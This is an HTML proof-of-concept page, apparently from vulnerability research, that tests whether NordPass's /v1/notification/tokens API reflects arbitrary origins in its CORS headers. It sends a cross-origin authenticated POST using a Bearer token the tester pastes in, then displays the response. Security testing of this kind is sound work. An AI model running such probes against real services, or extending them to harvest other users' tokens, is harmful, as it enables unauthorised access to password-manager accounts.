<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - NordPass</title>
  <style>
    body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }
    input { width: 100%; padding: 8px; margin: 8px 0; background: #2d2d2d; color: #fff; border: 1px solid #555; }
    button { padding: 10px 20px; background: #0078d4; color: white; border: none; cursor: pointer; }
    pre { background: #2d2d2d; padding: 15px; overflow-x: auto; white-space: pre-wrap; }
    .success { color: #4ec9b0; }
    .error   { color: #f44747; }
  </style>
</head>
<body>
  <h2>NordPass CORS PoC — /v1/notification/tokens</h2>
  <p>Origin: <strong id="origin"></strong></p>

  <label>Bearer Token (from DevTools → Network → Authorization header):</label>
  <input type="text" id="token" placeholder="Paste Bearer token here" />

  <label>app_user_uid (from request body):</label>
  <input type="text" id="uid" placeholder="Paste app_user_uid here" />

  <button onclick="runPoC()">Send Request</button>

  <h3>Result:</h3>
  <pre id="output">Waiting...</pre>

<script>
document.getElementById('origin').textContent = window.location.origin;

async function runPoC() {
  const token = document.getElementById('token').value.trim();
  const uid   = document.getElementById('uid').value.trim();
  const out   = document.getElementById('output');

  if (!token || !uid) {
    out.innerHTML = '<span class="error">Fill in both fields first.</span>';
    return;
  }

  out.textContent = 'Sending request...';

  try {
    const response = await fetch('https://api.nordpass.com/v1/notification/tokens', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token,
        'Nordpass-User-Agent': 'NordPass webvault (7.13.5) Windows',
      },
      body: JSON.stringify({
        app_user_uid: uid,
        platform_id: 600,
        protocol: 'ws'
      })
    });

    // Capture CORS response headers
    const acao = response.headers.get('access-control-allow-origin');
    const body = await response.json();

    out.innerHTML =
      '<span class="success">✓ Request succeeded — Origin was reflected!</span>\n\n' +
      'Access-Control-Allow-Origin: ' + acao + '\n\n' +
      'Response body:\n' +
      JSON.stringify(body, null, 2);

  } catch (err) {
    out.innerHTML =
      '<span class="error">✗ Request blocked by browser CORS policy.</span>\n\n' +
      'Error: ' + err.message + '\n\n' +
      'This means the server did NOT reflect your origin.\n' +
      'Check DevTools → Console for details.';
  }
}
</script>
</body>
</html>
